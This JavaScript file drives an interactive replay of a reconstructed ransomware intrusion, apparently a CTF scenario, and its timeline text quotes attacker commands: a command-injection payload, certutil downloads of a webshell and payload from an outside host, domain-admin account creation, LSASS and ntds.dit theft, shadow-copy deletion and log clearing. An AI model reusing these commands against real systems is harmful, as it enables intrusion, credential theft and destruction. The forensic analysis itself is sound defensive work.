
/* ------------------ reveal on scroll ------------------ */
const io = new IntersectionObserver(entries => {
  entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('in'); });
}, { threshold: 0.08 });
document.querySelectorAll('.reveal').forEach(el => io.observe(el));

/* ====================================================== */
/*          KILL-CHAIN REPLAY ENGINE                      */
/* ====================================================== */

// Converts HH:MM:SS UTC on 2026-03-08 into seconds-since-18:50
const BASE_H = 18, BASE_M = 50;
function toSec(hms) {
  const [h,m,s] = hms.split(':').map(Number);
  return (h - BASE_H) * 3600 + (m - BASE_M) * 60 + (s||0);
}
function fmtClock(sec) {
  const total = Math.max(0, Math.floor(sec));
  const h = BASE_H + Math.floor(total / 3600);
  const m = BASE_M + Math.floor((total % 3600) / 60);
  const s = total % 60;
  const hh = h >= 24 ? h - 24 : h;
  return `${String(hh).padStart(2,'0')}:${String(m%60 + 60*Math.floor(m/60)).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
}
function fmtElapsed(sec) {
  sec = Math.max(0, Math.floor(sec));
  const h = Math.floor(sec / 3600);
  const m = Math.floor((sec % 3600) / 60);
  const s = sec % 60;
  return `T+${h.toString().padStart(1,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
}

// Full 164-minute event list (18:38:29 → 22:22 · DD23 ground truth) — UTC timestamps, host focus, edge IDs, act, description
const EVENTS = [
  { t:'13:39:16', host:'IIS',  act:'0',   edge:null,               desc:'PRE-ATTACK SCENARIO VALIDATION (DD23.6) · ?url=Google.com && certutil -urlcache -f http://173.230.136.180:80/agent.exe %TEMP%\\jb.exe — from 216.82.9.162 (normal IP for the AWS account · Root+MFA admin, DD6.1/DD8.2/DD14). Same tool-server + same vuln endpoint the attacker uses 5 h later. Three indicators tie this to author infrastructure: (1) same Linode tool-server (173.230.136.180); (2) jb.exe crosswalks to jb_aws_cli IAM user (DD7) + JackOfAllHacks-Triages KAPE dir (DD14); (3) source IP has 18,035 CloudTrail console-reads on attack day (DD8.2). Proves attacker-infra is scenario-provisioned; does NOT prove 18:38 operator = 13:39 admin.' },
  { t:'18:38:29', host:'IIS',  act:'I',   edge:'eg-injection',     desc:'TRUE initial access (DD23 · 58 min earlier than v2) · baseline GET / from 172.236.127.251 (Linode, AS63949) — reconnaissance begins · 5 h after the 13:39 author pre-validation' },
  { t:'18:38:45', host:'IIS',  act:'I',   edge:'eg-injection',     desc:'GET /CheckStatus.aspx — vulnerable endpoint discovered (DD23.2)' },
  { t:'18:40:01', host:'IIS',  act:'I',   edge:'eg-injection',     desc:'First injection probe · ?url=google.com | whoami — pipe separator, fails (DD23.2)' },
  { t:'18:41:13', host:'IIS',  act:'I',   edge:'eg-injection',     desc:'First SUCCESSFUL injection · && metacharacter works on CheckStatus.aspx (DD23.2)' },
  { t:'18:43:43', host:'IIS',  act:'I',   edge:'eg-injection',     desc:'type C:\\inetpub\\wwwroot\\web.config — config disclosure (DD23.2)' },
  { t:'18:45:12', host:'IIS',  act:'I',   edge:'eg-injection',     desc:'dir C:\\TFTP Server\\ — fuzzing-chain ends, 6 min of reconnaissance complete (DD23.2)' },
  { t:'18:51:42', host:'IIS',  act:'I',   edge:'eg-certutil',      desc:'Webshell drop · certutil -urlcache -f http://173.230.136.180/so.aspx → C:\\inetpub\\wwwroot\\ · T1105 (DD23.3 · DD25 drop-time)' },
  { t:'18:52:20', host:'IIS',  act:'I',   edge:'eg-certutil',      desc:'Second-stage drop · certutil fetches iis.exe → %TEMP%\\ (SHA256 EFB53903…, IMPHASH C86A15AD… — DD24.1). First-execution 10 s later at 18:52:30 = fastest drop-to-exec in the corpus (DD25.2)' },
  { t:'19:08:42', host:'IIS',  act:'I',   edge:null,               desc:'First webshell POST · POST /so.aspx → cmd → powershell whoami · universal delivery channel for all post-foothold commands · Addendum DD4.2' },
  { t:'19:16:52', host:'IIS',  act:'I',   edge:null,               desc:'iis.exe writes C:\\TFTP Server\\SolarWinds.exe · writable-ACL binary swap (not unquoted-path) · Addendum B' },
  { t:'19:17:04', host:'IIS',  act:'I',   edge:null,               desc:'sc start SolarWindsTFTP — FAILED · DefaultAppPool lacks SeStartServicePrivilege (no 7036 follows) · Addendum H' },
  { t:'19:33:20', host:'IIS',  act:'I',   edge:'eg-injection',     desc:'EARLIEST KERBEROS SIGNAL · 4768 IIS-SERV-PROD$ TGT requested from WAN 198.51.100.10 · 2h 22m pre-detonation · Addendum N' },
  { t:'19:37:35', host:'IIS',  act:'I',   edge:null,               desc:'Donny (legit admin) reboots IIS after routine gpupdate/gpresult/lusrmgr.msc — NOT luck · operator chose auto-start service knowing reboot would fire it · Addendum U' },
  { t:'19:38:02', host:'IIS',  act:'I',   edge:null,               desc:'SolarWinds.exe → SYSTEM on Donny reboot · AdaptixC2 first callback to :8443 (RE-confirmed · 5/5 source matches · Addendum V)' },
  { t:'19:59:00', host:'WS01', act:'III', edge:'eg-admin-ws01',    desc:'\\\\10.3.10.12\\ADMIN$\\rnSylwOz.exe — SVR01 → WS01 service exec · same SHA256 beacon (IMPHASH 37E28CA3) · Addendum I' },
  { t:'19:59:10', host:'SVR01', act:'III',edge:'eg-lateral-svr',   desc:'AdaptixC2 SMB-pivot beacon running as SYSTEM on SVR01 (PID 9112) · Prefetch anchor RNSYLWOZ.EXE-E4BE7640.pf · Addendum P' },
  { t:'20:01:16', host:'SVR01', act:'II', edge:null,               desc:'SMOKING GUN · Sysmon EID 8 · rnSylwOz.exe (PID 9112) → CreateRemoteThread into Explorer PID 1332 · NewThreadId 10020 at 0xA40000 · StartModule="-" (floating shellcode) · the ONE malicious injection in the entire corpus · Addendum L' },
  { t:'20:02:14', host:'SVR01', act:'II', edge:null,               desc:'Explorer.EXE (beacon) → cmd.exe /c net user serviceaccount P@ssw0RD1! /add /domain · LAFAdmin never RDP\'d SVR01 — all actions run as Explorer children · Addendum AA' },
  { t:'20:03:05', host:'DC01', act:'II',  edge:null,               desc:'Explorer.EXE (beacon) → powershell net group "Domain Admins" serviceaccount /add · 4728 authoritative on DC · DA promotion' },
  { t:'20:03:30', host:'SVR01', act:'II', edge:null,               desc:'T1003.001 · LSASS dumped by injected Explorer thread 10020 (same thread ID from 20:01:16 injection) → C:\\Windows\\Temp\\abedgdaa.dmp · UNKNOWN CallTrace = floating shellcode · Sysmon EID 11 file-write confirms · NOT Task Manager · Addendum L · DD11.1' },
  { t:'20:05:00', host:'SVR01', act:'II', edge:null,               desc:'DonPAPI walks \\Dashlane\\ + Chrome Login Data · EID 12289/8200 trail · Addendum J' },
  { t:'20:08:07', host:'SVR01', act:'II', edge:null,               desc:'Explorer.EXE (beacon) browses C:\\Users\\donny\\Downloads + \\work\\MECM (LNK target evidence · MECM = SCCM/Endpoint Configuration Manager) · Addendum DD4.5' },
  { t:'20:16:13', host:'SVR01', act:'II', edge:null,               desc:'Explorer.EXE (beacon) → notepad.exe C:\\Share\\Project Frog.txt · Admin\\ToDo.txt · Legal\\txt\\clients.txt (31s of document recon via notepad) · Addendum AA' },
  { t:'20:18:46', host:'SVR01', act:'IV', edge:null,               desc:'Explorer.EXE (beacon) installs FileZilla from FileZilla_3.69.6_win64-setup.exe · pre-stages the SFTP exfil channel (fzsftp 9m later) · Addendum AA' },
  { t:'20:08:34', host:'DC01', act:'II',  edge:'eg-secretsdump',   desc:'4624/3 · LAFAdmin NTLM PtH from 198.51.100.10 (IIS non-interactive) — impacket smbexec.py --use-vss lands · DD10.1' },
  { t:'20:08:44', host:'DC01', act:'II',  edge:'eg-secretsdump',   desc:'SVC UnmfmnOL · vssadmin list shadows /for=C:' },
  { t:'20:08:53', host:'DC01', act:'II',  edge:'eg-secretsdump',   desc:'SVC QsYyAARL · vssadmin create shadow /For=C: ✓ Subpoena-6' },
  { t:'20:08:55', host:'DC01', act:'II',  edge:'eg-secretsdump',   desc:'SVC XCCVTGUb · vssadmin list shadows (GUID grab)' },
  { t:'20:09:03', host:'DC01', act:'II',  edge:'eg-secretsdump',   desc:'SVC SOUwKZNf · cmd /C copy GLOBALROOT\\...\\ntds.dit → Temp\\ZIFylmKF.tmp' },
  { t:'20:09:04', host:'DC01', act:'II',  edge:'eg-secretsdump',   desc:'SVC PovLjNTr · vssadmin delete shadows /shadow={af18f363-...}' },
  { t:'20:09:06', host:'DC01', act:'II',  edge:'eg-secretsdump',   desc:'5145 · LAFAdmin@198.51.100.10 reads ADMIN$\\Temp\\ZIFylmKF.tmp ✓' },
  { t:'20:13:26', host:'SVR01', act:'III',edge:null,               desc:'T1112 · reg add DisableRestrictedAdmin=0 — PtH RDP enabled' },
  { t:'20:14:07', host:'SVR01', act:'III',edge:'eg-pth-ws02',      desc:'Second RDP session reconnects · winlogon/csrss/smss/LogonUI/dwm/TSTheme chain · DD11.2' },
  { t:'20:14:08', host:'SVR01', act:'III',edge:'eg-pth-ws02',      desc:'rdpclip.exe spawns — RDP clipboard-redirection live · likely byte-channel for IamBatman/Firefox/FileZilla staging (DD11.2)' },
  { t:'20:16:44', host:'SVR01', act:'III',edge:null,               desc:'Masqueraded C:\\Users\\LAFAdmin\\Desktop\\Firefox.exe runs · distinct Prefetch hash FIREFOX.EXE-11BBBDDD.pf (vs real E60C0AA7) · T1036.005 · DD11.3' },
  { t:'20:18:46', host:'SVR01', act:'IV', edge:null,               desc:'FileZilla_3.69.6_win64_sponsored2-setup.exe launched · the "sponsored2" mirror bundles PlayaNext adware 8 s later · anticipated exfil path per KAPE target list (DD11.4 · DD14.4)' },
  { t:'20:18:54', host:'SVR01', act:'IV', edge:null,               desc:'PlayaNext_Chrome_signed.exe /b:1 /r:PNKB — adware side-effect of untrusted installer · unused in attack · DD11.4' },
  { t:'20:20:13', host:'SVR01', act:'IV', edge:null,               desc:'Drop C:\\ProgramData\\msupdate.exe (renamed makecab.exe · VT 0/72, known-distributor · Addendum VT)' },
  { t:'20:21:09', host:'SVR01', act:'IV', edge:null,               desc:'msupdate.exe /f list.txt /d CabinetName1=data.cab' },
  { t:'20:27:48', host:'SVR01', act:'IV', edge:null,               desc:'fzsftp.exe -v · first FileZilla SFTP session' },
  { t:'20:30:26', host:'SVR01', act:'IV', edge:'eg-sftp',          desc:'T1048.002 · data.cab → 172.236.127.251:22 user=root' },
  { t:'20:45:37', host:'DC02', act:'III', edge:null,               desc:'4624 workstation=\'kali\' — operator hostname leaked via NTLM ✓' },
  { t:'21:03:54', host:'DC02', act:'V',   edge:'eg-sysvol',        desc:'IamBatman.exe dropped to \\\\DC02\\SYSVOL\\sysvol\\ by explorer.exe PID 3272 · DFSR auto-replicates · exactly 1 HOUR after serviceaccount DA promotion at 20:03:05 — attacker used the hour for LSASS dump, NTDS theft, CAB assembly first (Addendum R · DD25.3)' },
  { t:'21:04:05', host:'DC02', act:'V',   edge:'eg-sysvol',        desc:'sysAV.bat dropped 11 SECONDS after IamBatman.exe = single upload-script orchestration, not manual (DD25.6). 54 min of pre-staged waiting until first detonation attempt at 21:58:34 — pre-staged-weapons category (DD25.2)' },
  { t:'21:08:28', host:'SVR01', act:'III',edge:null,               desc:'T1070.001 · LogDel.bat wevtutil cl 6 channels in 230ms — missed Sysmon (operator blind spot) · Addendum H' },
  { t:'21:42:11', host:'ROLE', act:'VI',  edge:'eg-imds',          desc:'T1552.005 · sts:GetCallerIdentity from 172.236.127.251 · 13-min gap from cred-steal (21:29:20) = operator exporting keys to workstation · Addendum X' },
  { t:'21:45:38', host:'S3',   act:'VI',  edge:'eg-s3',            desc:'CreateAccessKey jb_aws_cli → LimitExceededException · only the FIRST of four attempts fails · DD7 correction' },
  { t:'21:45:51', host:'S3',   act:'VI',  edge:'eg-s3',            desc:'CreateAccessKey donnieworks → SUCCESS · AKIA[REDACTED-FOR-PUBLICATION] stored (DD16 · never used in capture window = stockpile persistence)' },
  { t:'21:46:04', host:'S3',   act:'VI',  edge:'eg-s3',            desc:'CreateAccessKey doctorderm → SUCCESS · AKIA[REDACTED-FOR-PUBLICATION] stored (DD16)' },
  { t:'21:46:14', host:'S3',   act:'VI',  edge:'eg-s3',            desc:'CreateAccessKey coolcat → SUCCESS · AKIA[REDACTED-FOR-PUBLICATION] stored (DD16) · THREE live AKIA keys now in adversary hands · highest-impact residual artifact of entire incident' },
  { t:'21:49:16', host:'S3',   act:'VI',  edge:'eg-s3',            desc:'T1530 · 164 × s3:GetObject · 11,327 bytes · aws s3 cp from 212.8.249.213 — DD17 reveals this is a DECOY HONEYPOT (7 depts, ~23 objs each, parody topics like stolen_yogurt_investigation and emotional_support_otter) · 164 LOUD GETs draw triage away from the quiet 3 CreateAccessKey calls above · classic alert-fatigue tradecraft' },
  { t:'21:57:18', host:'ROLE', act:'VI',  edge:'eg-imds',          desc:'GuardDuty fires · <code>UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS</code> (Sev 8) · detection worked, response did not · 11 min 22 s before ransomware detonation — DD18.2 missed-response window · this is 1 of only 3 real fires against 383 synthetic samples pre-seeded by the author (0.75% signal-to-noise · DD19)' },
  { t:'21:58:34', host:'WS02', act:'V',   edge:null,               desc:'BOTCHED first detonation · bash-syntax bug: operator used <code>;</code> as separator in a cmd.exe target — only sysAV.bat ran, IamBatman never launched (zero .bWqQUx files pre-22:08) · 10-min detection opportunity starts here · Addendum DD5.1 · DD12.2' },
  { t:'21:58:36', host:'WS02', act:'V',   edge:null,               desc:'vssadmin delete shadows /all /quiet + 2× bcdedit (first host) — fires 10 min before encryption, no SIEM rule matched · DD12.2' },
  { t:'22:04:42', host:'WS02', act:'V',   edge:null,               desc:'Operator interlude · Notepad reads sysAV.bat via dllhost.exe COM — troubleshooting the botched chain · DD12.3' },
  { t:'22:07:07', host:'DC02', act:'V',   edge:null,               desc:'Operator interlude · Notepad reads sysAV.bat on DC02 — continued troubleshooting · DD12.3' },
  { t:'22:08:10', host:'DC02', act:'V',   edge:null,               desc:'Operator interlude · Notepad reads sysAV.bat on DC02 again — confirms sysAV launches IamBatman internally · DD12.3' },
  { t:'22:01:10', host:'ROLE', act:'V',   edge:'eg-imds',          desc:'GuardDuty re-fires · same <code>InstanceCredentialExfiltration.OutsideAWS</code> detector (Sev 8) · second missed-response beat · DD18.2' },
  { t:'22:08:39', host:'WS02', act:'V',   edge:null,               desc:'Second scheduled task mIglpUCO registered via atexec.py · fan-out tool = atexec (not smbexec) · DD12.1' },
  { t:'22:08:40', host:'WS02', act:'V',   edge:null,               desc:'Successful IamBatman launch — encryption loop begins (T1486) · first .bWqQUx files appear at 22:08:58 · ✓ Big oof 3 · DD12.4 · <b>11 min 22 s after GuardDuty\'s 21:57:18 first alert — detection worked, response did not (DD18.2)</b>' },
  { t:'22:14:44', host:'ROLE', act:'V',   edge:'eg-imds',          desc:'GuardDuty fires <code>AttackSequence:IAM/CompromisedCredentials</code> (Sev 9) — highest-severity cloud alert of the incident · still no human response · DD18.2' },
  { t:'22:09:15', host:'WS01', act:'V',   edge:null,               desc:'Task \\OlgyLYbd registered (1.2s lifetime fingerprint)' },
  { t:'22:09:16', host:'WS01', act:'V',   edge:null,               desc:'WS01 vssadmin delete shadows /all /quiet' },
  { t:'22:09:42', host:'WS01', act:'V',   edge:'eg-sysvol',        desc:'cmd /C cmd /c \\\\laf-dc02\\sysvol\\sysAV.bat > pRlGOUon.tmp' },
  { t:'22:09:46', host:'WS01', act:'V',   edge:'eg-sysvol',        desc:'T1486 · IamBatman.exe encrypt C:\\ — detonation' },
  { t:'22:09:43', host:'SVR01', act:'V',  edge:null,               desc:'SVR01 vssadmin delete shadows /all /quiet' },
  { t:'22:10:14', host:'DC01', act:'V',   edge:null,               desc:'DC01 vssadmin delete shadows /all /quiet — NTDS host wiped' },
  { t:'22:10:52', host:'DC02', act:'V',   edge:null,               desc:'DC02 vssadmin delete shadows /all /quiet — cascade-wipe ends · DC02 natural completion: 388 files in 5.4 s, few user .txt/.pdf/.csv on DCs (DD14.1 walks back DD13.3 "self-abort" reading)' },
  { t:'22:56:42', host:'WS02', act:'V',   edge:null,               desc:'ACTUAL last encrypt · brndlog.txt.bWqQUx on WS02 (Ludus-telemetry log that kept being rewritten) · +10 min past v2 end-time · full impact 58 min (21:58:34 → 22:56:42) · DD13.5' },
  // Post-detonation · CTF-author KAPE collection workflow (DD14)
  { t:'22:12:16', host:'SVR01', act:'IR',  edge:null,               desc:'CTF-author KAPE collection begins · localuser@RED1 RDP from 198.51.100.3 (author\'s admin workstation, present on WS02+DC02 since 2026-03-04 — four days pre-attack) · DD14.2' },
  { t:'22:20:37', host:'WS01', act:'IR',   edge:null,               desc:'Author KAPE workflow: curl -k https://bigmac.io.s3.amazonaws.com/kape.zip → kape --sync → kape --target !SANS_Triage,FileZillaClient,WinDefendDetectionHist,… · bigmac.io is the author\'s tool mirror, NOT C2 · DD14.3' },
  { t:'22:46:45', host:'SVR01', act:'IR',  edge:null,               desc:'SVR01 memory image captured by author · beacon to 173.230.136.180:8443 still ESTABLISHED (2h 48m uptime · Addendum W · single long-lived TLS tunnel, not a heartbeat beacon)' },
  { t:'22:47:00', host:'WS02', act:'IR',   edge:null,               desc:'Final KAPE pull on WS02 · collection order: SVR01 → DC01 → DC02 → WS01 → WS02 (WS02 last because IamBatman was still running) · DD14.3' },
];
EVENTS.forEach(e => e.sec = toSec(e.t));
const REPLAY_END = Math.max(...EVENTS.map(e => e.sec)) + 30; // pad 30s

// Act windows for tint / display
const ACTS = [
  { id:'I',   name:'INGRESS',       start:toSec('18:38:29'), end:toSec('19:38:03'), color:'var(--cyan)' },
  { id:'II',  name:'NTDS EXFIL',    start:toSec('20:02:14'), end:toSec('20:09:06'), color:'var(--violet)' },
  { id:'III', name:'LATERAL + PTH', start:toSec('20:13:26'), end:toSec('21:08:28'), color:'var(--amber)' },
  { id:'IV',  name:'COLLECTION',    start:toSec('20:20:13'), end:toSec('20:30:26'), color:'var(--amber)' },
  { id:'VI',  name:'CLOUD',         start:toSec('21:42:11'), end:toSec('21:45:38'), color:'var(--green)' },
  { id:'V',   name:'IMPACT',        start:toSec('21:58:34'), end:toSec('22:56:42'), color:'var(--red)' },
];
function currentAct(sec) {
  let active = null;
  for (const a of ACTS) if (sec >= a.start && sec <= a.end + 30) active = a;
  return active;
}

// Scrubber ticks (every 15 min)
(function buildTicks() {
  const ticksRow = document.getElementById('scrubberTicks');
  for (let s = 0; s <= REPLAY_END; s += 900) {
    const tk = document.createElement('div');
    tk.className = 'scrubber-tick';
    tk.style.left = `${(s / REPLAY_END) * 100}%`;
    tk.textContent = fmtClock(s);
    ticksRow.appendChild(tk);
  }
  // Event markers
  EVENTS.forEach((ev, i) => {
    const m = document.createElement('div');
    m.className = 'scrubber-event' + (ev.act === 'V' ? ' impact' : '');
    m.style.left = `${(ev.sec / REPLAY_END) * 100}%`;
    m.dataset.idx = i;
    m.title = ev.t + ' · ' + ev.desc;
    ticksRow.appendChild(m);
  });
  // Act phase separators
  ACTS.forEach(a => {
    const p = document.createElement('div');
    p.className = 'scrubber-phase';
    p.style.left = `${(a.start / REPLAY_END) * 100}%`;
    p.innerHTML = `<div class="lbl" style="color:${a.color}">${a.id} ${a.name}</div>`;
    ticksRow.appendChild(p);
  });
})();

// Replay state
let replaySec = 0;
let playing = false;
let speed = 60;
let lastTick = 0;
let firedSet = new Set();
let currentEventIdx = -1;

const scrubber = document.getElementById('scrubber');
const scrubberFill = document.getElementById('scrubberFill');
const replayActLabel = document.getElementById('replayActLabel');
const eventCard = document.getElementById('eventCard');
const ecTime = document.getElementById('ecTime');
const ecElapsed = document.getElementById('ecElapsed');
const ecHost = document.getElementById('ecHost');
const ecDesc = document.getElementById('ecDesc');
const ecTags = document.getElementById('ecTags');
const eventNum = document.getElementById('eventNum');
const eventTotal = document.getElementById('eventTotal');
const btnPlay = document.getElementById('btnPlay');
const btnReset = document.getElementById('btnReset');
const btnPrev = document.getElementById('btnPrev');
const btnNext = document.getElementById('btnNext');
const playIcon = document.getElementById('playIcon');
const playLabel = document.getElementById('playLabel');

if (eventTotal) eventTotal.textContent = EVENTS.length;

const HOST_LABEL = {
  IIS:'IIS', DC01:'DC01', DC02:'DC02', SVR01:'SVR01', WS01:'WS01', WS02:'WS02',
  OP:'OPERATOR', TOOL:'C2 VPS', SINK:'SFTP', ROLE:'IAM ROLE', S3:'S3',
};
const HOST_COLOR = {
  IIS:'cyan', DC01:'red', DC02:'red', SVR01:'amber', WS01:'violet', WS02:'violet',
  OP:'red', TOOL:'red', SINK:'red', ROLE:'green', S3:'green',
};

function parseTags(desc) {
  const tags = [];
  // TTP IDs like T1190, T1021.001
  const ttp = desc.match(/\bT\d{4}(?:\.\d{3})?\b/g);
  if (ttp) ttp.forEach(t => tags.push({ cls: 'ttp', text: t }));
  // Event IDs like EID 5145, "4624/3", "EID 11"
  const eid = desc.match(/\bEID\s?\d{2,5}\b|\b\d{4}\/\d\b/gi);
  if (eid) eid.forEach(t => tags.push({ cls: 'eid', text: t.replace(/eid\s?/i,'EID ') }));
  return tags;
}
function richDesc(desc) {
  // UNC + absolute Windows paths + env tokens
  let out = desc
    .replace(/(\\\\[\w.\-$\\]+\\[^\s,·]*|C:\\[^\s,·]+|%TEMP%|%COMSPEC%)/g, '<code>$1</code>');
  // Executable / archive / log / config extensions
  out = out.replace(/\b([\w.\-]+\.(exe|bat|aspx|dit|tmp|dmp|cab|dll|txt|log|evtx|xml|ps1))\b/gi, '<code>$1</code>');
  // IP addresses (with optional port)
  out = out.replace(/\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(?::\d+)?)\b/g, '<code>$1</code>');
  // Backticked literals
  out = out.replace(/`([^`]+)`/g, '<code>$1</code>');
  // Bold TTP IDs
  out = out.replace(/\bT\d{4}(?:\.\d{3})?\b/g, m => '<b>'+m+'</b>');
  // Bold security terms + actor identifiers
  out = out.replace(/\b(SYSTEM|LAFAdmin|NTLM|SYSVOL|PtH|NTDS|LSASS|IMDSv2|STS|IAM|Impacket|DonPAPI|Mimikatz|secretsdump|makecab|FileZilla|Volatility|krbtgt|vssadmin|ntds\.dit|Saiyan Spider)\b/g, '<b>$1</b>');
  // Swap plain " · " for a styled separator
  out = out.replace(/ · /g, ' <span class="sep-dot">·</span> ');
  return out;
}

function setScrubber(sec) {
  replaySec = Math.max(0, Math.min(sec, REPLAY_END));
  scrubberFill.style.width = `${(replaySec / REPLAY_END) * 100}%`;

  const act = currentAct(replaySec);
  if (act) {
    replayActLabel.textContent = `ACT ${act.id} · ${act.name}`;
    replayActLabel.style.color = act.color;
    replayActLabel.style.borderColor = act.color;
    replayActLabel.classList.add('active');
  } else {
    const done = replaySec >= REPLAY_END;
    replayActLabel.textContent = done ? 'COMPLETE' : 'STANDBY';
    replayActLabel.style.color = done ? 'var(--green)' : 'var(--dim)';
    replayActLabel.style.borderColor = done ? 'var(--green-d)' : 'var(--line-2)';
    replayActLabel.classList.toggle('active', done);
  }
  applyEventsForTime(replaySec);
}

function applyEventsForTime(sec) {
  const edgeSet = new Set();
  const hostSet = new Set();
  let latestIdx = -1;
  EVENTS.forEach((ev, i) => {
    if (ev.sec <= sec) {
      if (ev.edge) edgeSet.add(ev.edge);
      hostSet.add(ev.host);
      latestIdx = i;
    }
  });
  // Edges
  document.querySelectorAll('.edge-g').forEach(g => {
    const id = g.id;
    if (edgeSet.has(id)) {
      g.classList.remove('edge-dim');
      const eActive = EVENTS.find(e => e.edge === id && e.sec <= sec && sec - e.sec < 4);
      if (eActive) {
        g.classList.add('edge-fire');
        setTimeout(() => g.classList.remove('edge-fire'), 800);
      } else {
        g.classList.add('edge-live');
      }
    } else {
      g.classList.add('edge-dim');
      g.classList.remove('edge-fire','edge-live');
    }
  });
  // Host pulse
  document.querySelectorAll('.host-clickable').forEach(n => {
    const h = n.dataset.host;
    if (hostSet.has(h)) {
      n.classList.remove('host-dim');
      const active = EVENTS.find(e => e.host === h && e.sec <= sec && sec - e.sec < 5);
      if (active) n.classList.add('host-active');
      else n.classList.remove('host-active');
    } else {
      n.classList.add('host-dim');
      n.classList.remove('host-active');
    }
  });
  // Scrubber event markers
  document.querySelectorAll('.scrubber-event').forEach(m => {
    const idx = +m.dataset.idx;
    if (idx <= latestIdx) m.classList.add('fired');
    else m.classList.remove('fired');
  });
  // Hero event card
  if (latestIdx !== currentEventIdx) {
    currentEventIdx = latestIdx;
    // Clear act classes
    eventCard.className = 'event-card';
    if (latestIdx >= 0) {
      const ev = EVENTS[latestIdx];
      const nxt = EVENTS[latestIdx + 1];
      ecTime.textContent = ev.t;
      ecElapsed.textContent = fmtElapsed(ev.sec);
      ecHost.textContent = HOST_LABEL[ev.host] || ev.host;
      ecHost.dataset.hostColor = HOST_COLOR[ev.host] || '';
      ecDesc.innerHTML = richDesc(ev.desc);
      eventCard.classList.add('act-' + ev.act, 'fired');
      setTimeout(() => eventCard.classList.remove('fired'), 900);
      // Tags
      const tags = parseTags(ev.desc);
      let tagHtml = tags.map(t => `<span class="ec-tag ${t.cls}">${t.text}</span>`).join('');
      if (nxt) {
        const dt = nxt.sec - ev.sec;
        const dtStr = dt < 60 ? `${dt}s` : dt < 3600 ? `${Math.round(dt/60)}m` : `${(dt/3600).toFixed(1)}h`;
        tagHtml += `<span class="ec-tag next">next in ${dtStr}</span>`;
      }
      ecTags.innerHTML = tagHtml || '<span class="ec-tag next">no tag</span>';
      eventNum.textContent = latestIdx + 1;
    } else {
      ecTime.textContent = '—:—:—';
      ecElapsed.textContent = 'STANDBY';
      ecHost.textContent = '——';
      ecHost.dataset.hostColor = '';
      ecDesc.innerHTML = 'Press <b>▶ PLAY</b> to replay the 164-minute intrusion. Edges activate as their UTC timestamp is reached; hosts pulse when under operator control. Speed picker below.';
      ecTags.innerHTML = '<span class="ec-tag next">Waiting</span>';
      eventNum.textContent = '0';
    }
  }
}

function tick(now) {
  if (!playing) return;
  if (!lastTick) lastTick = now;
  const dt = (now - lastTick) / 1000; // seconds
  lastTick = now;
  setScrubber(replaySec + dt * speed);
  if (replaySec >= REPLAY_END) {
    playing = false;
    setPlayLabel(false);
  } else {
    requestAnimationFrame(tick);
  }
}

function setPlayLabel(isPlaying) {
  if (playIcon) playIcon.textContent = isPlaying ? '⏸' : '▶';
  if (playLabel) playLabel.textContent = isPlaying ? 'PAUSE' : 'PLAY';
}
btnPlay.addEventListener('click', () => {
  playing = !playing;
  setPlayLabel(playing);
  if (playing) {
    if (replaySec >= REPLAY_END) setScrubber(0);
    lastTick = 0;
    requestAnimationFrame(tick);
  }
});
btnReset.addEventListener('click', () => {
  playing = false; setPlayLabel(false); setScrubber(0);
});
btnPrev.addEventListener('click', () => {
  const prev = [...EVENTS].reverse().find(e => e.sec < replaySec - 1);
  setScrubber(prev ? prev.sec : 0);
});
btnNext.addEventListener('click', () => {
  const nxt = EVENTS.find(e => e.sec > replaySec + 1);
  setScrubber(nxt ? nxt.sec : REPLAY_END);
});
document.getElementById('speedPick').querySelectorAll('button').forEach(b => {
  b.addEventListener('click', () => {
    speed = +b.dataset.s;
    document.querySelectorAll('#speedPick button').forEach(x => x.classList.remove('active'));
    b.classList.add('active');
  });
});
scrubber.addEventListener('click', (e) => {
  const rect = scrubber.getBoundingClientRect();
  const pct = (e.clientX - rect.left) / rect.width;
  setScrubber(pct * REPLAY_END);
});

// initial paint
setScrubber(0);

/* ====================================================== */
/*          HOST DRAWER                                   */
/* ====================================================== */
const HOST_DETAIL = {
  IIS: {
    name: 'IIS_SERV_PROD', ip: '198.51.100.10', role: 'Public IIS · Entry Point · Modern OSS C2 Beacon Host',
    sections: [
      { title: 'Role', body: '<p>Internet-facing ASP.NET web server running <code>CheckStatus.aspx</code>. Ingress for OS command injection; later repurposed as on-net operator pivot and C2 beacon host after the SolarWinds.exe service-binary replacement was executed on Donny\'s unrelated reboot (the root cause was a writable ACL on <code>C:\\TFTP Server\\</code>, not unquoted-path truncation).</p>' },
      { title: 'Key Events', events: [
        { t:'18:51:41', d:'<b>T1190</b> GET injection from 172.236.127.251' },
        { t:'18:51:42', d:'certutil -urlcache drops <b>so.aspx</b> to C:\\inetpub\\wwwroot' },
        { t:'18:52:19', d:'certutil drops <b>iis.exe</b> to %TEMP%' },
        { t:'19:16:52', d:'iis.exe writes <b>C:\\TFTP Server\\SolarWinds.exe</b>' },
        { t:'19:17:04', d:'<code>sc start SolarWindsTFTP</code>' },
        { t:'19:38:02', d:'<b>SYSTEM</b> via writable-ACL binary swap (on Donny reboot) · <b>AdaptixC2 first callback</b> :8443 (RE-confirmed · 5/5 source matches)' },
        { t:'21:42:11', d:'IMDSv2 token + sts:GetCallerIdentity' },
      ]},
      { title: 'Evidence Paths', paths: [
        'E/inetpub/logs/LogFiles/W3SVC1/u_ex260308.log',
        'E/inetpub/wwwroot/so.aspx',
        'E/inetpub/wwwroot/CheckStatus.aspx',
        'C/Windows/TEMP/iis.exe',
        'C/TFTP Server/SolarWinds.exe',
        'C/Windows/System32/winevt/logs/Security.evtx',
        'C/Windows/System32/winevt/logs/Microsoft-Windows-Sysmon%4Operational.evtx',
        'C/Windows/System32/winevt/logs/Microsoft-Windows-PowerShell%4Operational.evtx',
      ]},
      { title: 'Key TTPs', body: '<p><code>T1190</code> · <code>T1505.003</code> · <code>T1059.003</code> · <code>T1574.009</code> · <code>T1552.005</code></p>' },
    ]
  },
  DC01: {
    name: 'LAF-DC01', ip: '10.3.10.10', role: 'Primary Domain Controller · NTDS Target',
    sections: [
      { title: 'Role', body: '<p>Primary DC. impacket-secretsdump <code>--use-vss</code> target. ntds.dit copied from a shadow copy volume to <code>C:\\Windows\\Temp\\ZIFylmKF.tmp</code> and picked up over ADMIN$ by the operator at 20:09:06.</p>' },
      { title: 'Key Events', events: [
        { t:'20:03:05', d:'4728 · serviceaccount → Domain Admins (authoritative)' },
